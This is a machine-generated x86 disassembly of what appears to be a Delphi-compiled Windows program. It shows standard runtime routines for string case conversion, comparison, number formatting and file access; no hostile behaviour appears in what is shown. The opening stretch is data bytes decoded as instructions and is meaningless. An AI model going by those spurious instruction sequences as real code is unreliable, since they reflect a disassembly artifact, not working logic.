add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 + 0x40 ] bl
add [ eax + eax ] cl
add [ eax ] al
mov [ edi + 0x40 ] ch
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
add [ eax + eax ] cl
add [ eax ] al
mov [ edi + 0x40 ] ch
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] dl
inc ebp
inc ecx
mov eax eax
mov al [ 0x4077 ]
add [ eax ] al
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
jbe r-xdata
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
outsd
jb r-xdata
arpl [ ebp + eax * 2 + 0x72 ] si
jb r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
inc ebp
inc ecx
bound esi [ ebx + 0x74 ]
jb r-xdata
dec eax
xor al [ eax ]
push cs
adc al 0x79
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 2 ] dl
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax - 0x5fffbf91 ] cl
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] cl
inc ebp
dec edi
push ebx
inc ebp
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0xc004078
imul ebp [ edi + 0x6e ] 0x6c696146
lea eax [ eax ]
pop esp
js r-xdata
add [ eax ] al
add [ eax - 0x5fffbf91 ] cl
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ 0x72615645 ] cl
imul esp [ ecx + 0x6e ] 0x72724574
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xc004077 ]
insb
outsd
ja r-xdata
xchg esp eax
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax + edx + 0x53080040 ] dl
jns r-xdata
outsd
jb r-xdata
jae r-xdata
adc [ ebp + 0x41 ] al
add [ eax ] al
add [ eax - 0x5fffbf91 ] cl
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
mov eax 0x4078
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004078 ] bh
add [ ecx ] dl
add ebp [ esi ]
aaa
xor al 0x4
add [ eax ] al
add [ eax + edx + r--data ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
add [ eax + eax ] cl
add [ eax ] al
mov [ edi + 0x40 ] ch
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jns r-xdata
inc ebp
jb r-xdata
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ esi ] cl
add [ edx + esi ] cl
or al 0x32
dec eax
ja r-xdata
test al 0x34
push ebp
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ esi ] cl
inc ebp
dec ecx
outsb
je r-xdata
inc eax
add [ ecx + edi * 2 + 0x40 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
jpe r-xdata
je r-xdata
inc eax
add al dh
xor [ eax ] eax
or al 0x32
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 2 + 0x40 ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ecx ] cl
inc ebp
inc ebx
outsd
outsb
je r-xdata
add [ edx + esi ] cl
add [ eax ] al
add [ eax ] al
loopne r-xdata
je r-xdata
add [ esp + esi + 0x34a80040 ] dh
xor al 0x40
insb
jae r-xdata
aam 0xe9
aas
push edi
add [ eax ] al
add eax 0xffffffd4
jmp sub_40d1e8
add [ eax + eax ] al
add [ eax - 0x5fffbff0 ] ah
add [ eax ] al
add [ eax ] al
and [ edx + 0x40 ] bh
imul ebp [ edi + 0x6e ] 0x40798490
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407a743f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
jpe r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shr [ eax + 0x11004079 ] 0x3
cmp [ cs : esp + eax ] dh
add [ eax ] al
add [ eax + edx + r--data ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
xor ecx ecx
outsb
imul edi [ edx + 0x65 ] r-xdata
add [ edx + esi ] cl
inc eax
add [ eax + edx * 8 ] al
inc eax
add [ esp + edx * 2 ] ah
dec ebp
jne r-xdata
add [ eax + 0x407a ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
jpe r-xdata
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add eax 0xffffffd4
jmp sub_40d17c
inc eax
add [ eax - 0x32 ] ah
inc eax
add [ ebx ] dl
push esp
push esp
push 0x64616572
dec esp
outsd
arpl [ ecx + 0x6c ] sp
add [ edx + esi ] cl
je r-xdata
jg r-xdata
je r-xdata
je r-xdata
add [ eax ] dh
add [ eax ] al
add [ ecx + edx + 0x34a00040 ] dl
inc eax
add [ edi + edx * 2 + 0x40 ] al
add [ eax + 0x57 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax + 0x57 ] ah
inc eax
inc ebx
outsd
jne r-xdata
insb
jae r-xdata
adc eax rw-data
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026dc
call ebx
pop ebx
retn
add [ eax ] al
call sub_4039e4
pop edi
pop esi
pop ebx
retn
call sub_40b7f0
push edx
popad
inc ebp
js r-xdata
mov eax eax
push ebx
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx ] dl
inc ebp
push ebx
popad
arpl [ gs : ecx + 0x6c ] sp
insb
inc ebp
js r-xdata
inc eax
sar bh 0xff
insb
jne r-xdata
mov edx ebx
call sub_402c64
mov eax esi
pop esi
pop ebx
retn
dec [ ebx + 0x33c68bf0 ]
leave
arpl [ eax + 0x72 ] bp
outsd
mov eax ebx
call sub_4026bc
mov esi eax
mov eax esi
jns r-xdata
imul esi [ esi + 0x65 ] 0x74697257
push ebx
sub_407b24
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407b58
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7f0
call sub_4039e4
pop edi
pop esi
pop ebx
retn
sub_407b7c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4026bc
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402c64
mov eax esi
pop esi
pop ebx
retn
sub_407b9c
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026dc
call ebx
pop ebx
retn
sub_407bc8
push ebx
mov ebx eax
mov eax 0xc
call sub_4026bc
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_407b9c
pop ebx
retn
sub_407c00
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404268
mov ebx eax
mov eax edi
mov edx ebx
call sub_4045f4
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407c3c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404268
mov ebx eax
mov eax edi
mov edx ebx
call sub_4045f4
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407c78
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407ca8
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407cc8
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_407d1c
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407cc8
test eax eax
jne r-xdata
sub_407d40
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404268
mov ebx eax
mov eax esi
call sub_404468
mov edx eax
mov eax edi
mov ecx ebx
call sub_404098
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharUpperBuffA
sub_407d74
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404268
mov ebx eax
mov eax esi
call sub_404468
mov edx eax
mov eax edi
mov ecx ebx
call sub_404098
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharLowerBuffA
sub_407da8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404268
push eax
mov eax esi
call sub_404468
push eax
mov eax ebx
call sub_404268
push eax
mov eax ebx
call sub_404468
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407de0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404268
push eax
mov eax esi
call sub_404468
push eax
mov eax ebx
call sub_404268
push eax
mov eax ebx
call sub_404468
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407e30
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_407e50
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_404268
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_403fa8
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_4044c8
pop ebp
pop edi
pop esi
pop ebx
retn
sub_407ea0
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_404268
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_404268
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_407f04
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_407f1a
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_407f1a
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407f1a
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407f50
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_407f04
mov edx esi
pop eax
call sub_404098
add esp 0x10
pop esi
retn
sub_407f70
or cl cl
jne sub_407fa4
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_407fa4
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_407fa4
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_407fa4
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_40803c
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_407f70
mov edx esi
pop eax
call sub_404098
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_408064
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_407f04
mov edx esi
pop eax
call sub_404098
add esp 0x20
pop esi
retn
xor edx edx
sub_40808c
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402c84
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407b58
sub_4080e0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402c84
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408100
mov eax [ rw-data ]
call sub_404e1c
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_404e1c
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404fd8
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403ffc
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404fd8
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403ffc
sub_408190
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_407e18
test al al
je r-xdata
sub_4081cc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_409544
mov edx eax
test dl dl
je r-xdata
call sub_408100
push ebp
mov eax [ rw-data ]
call sub_404e24
mov edx eax
mov eax [ rw-data ]
call sub_408190
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_404e24
mov edx eax
mov eax [ rw-data ]
call sub_408190
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_408268
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403ffc
call sub_408100
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403ffc
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403ffc
jmp r-xdata
pop esi
pop ebx
retn
sub_4082b8
push cs
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
sete al
add esp 0x400
pop esi
pop ebx
retn
popad
je r-xdata
inc eax
add al ch
0x33ffffc5 0x55c0
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add al 0x0
add [ eax ] al
mov eax eax
push ebx
push esi
add esp 0xfffffc00
mov esi eax
mov ebx edx
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
call LoadStringA
mov ecx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_404098
cmp [ ebx + 0x4 ] 0x0
sub_408310
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404914
xor eax eax
push ebp
push sub_408376
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
lea eax [ ebp - 0x4 ]
call sub_403fa8
lea edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405524
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403ffc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40837d
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4049e4
retn
sub_408398
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_404468
push eax
call CreateFileA
sub_4083f0
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_404468
push eax
call CreateFileA
pop ebx
retn
sub_40841c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408448
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408474
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4084b4
push ebp
mov ebp esp
add esp 0xfffffeb4
push ebx
mov ebx eax
lea eax [ ebp - 0x14c ]
push eax
mov eax ebx
call sub_404468
push eax
call FindFirstFileA
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
call FindClose
test [ ebp - 0x14c ] 0x10
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x138 ]
push eax
call FileTimeToLocalFileTime
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call FileTimeToDosDateTime
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40852c
push ebx
push esi
mov esi eax
mov eax esi
call sub_404268
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40c0ac
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_40855c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_404268
mov edi eax
mov eax ebx
call sub_404468
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_408860
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40c0ac
cmp al 0x2
jne r-xdata
dec edi
sub_4085ac
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_40855c
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_4044c8
pop edi
pop esi
pop ebx
retn
sub_4085e4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40855c
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_403fa8
cmp [ esi + ebx - 0x1 ] 0x2e
jne r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_4044c8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40862c
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_404468
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_404098
add esp 0x108
pop esi
pop ebx
retn
sub_408668
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404d7c
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404d7c
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_408718
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_408740
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_408774
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_404268
push eax
mov eax ebx
call sub_404468
mov edx eax
mov eax esi
pop ecx
call sub_408740
pop esi
pop ebx
retn
sub_408798
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_404468
mov edx eax
mov ecx edi
mov eax ebx
call sub_408740
pop edi
pop esi
pop ebx
retn
sub_4087b8
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_4087dc
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
